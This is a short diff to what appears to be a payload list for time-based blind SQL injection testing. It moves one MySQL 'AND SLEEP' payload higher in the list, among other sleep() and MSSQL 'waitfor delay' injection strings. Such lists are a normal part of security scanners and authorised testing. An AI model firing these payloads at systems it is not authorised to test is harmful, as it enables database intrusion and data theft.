@@ -1,5 +1,6 @@
 sleep(_TIME_)
 sleep(_TIME_)#
+1'AnD SLEEP(_TIME_)='
 1 or sleep(_TIME_)#
 " or sleep(_TIME_)#
 ' or sleep(_TIME_)#
@@ -11,7 +12,6 @@ sleep(_TIME_)#
 1)) or sleep(_TIME_)#
 ")) or sleep(_TIME_)="
 ')) or sleep(_TIME_)='
-1'AnD SLEEP(_TIME_)='
 ;waitfor delay '0:0:_TIME_'--
 );waitfor delay '0:0:_TIME_'--
 ';waitfor delay '0:0:_TIME_'--
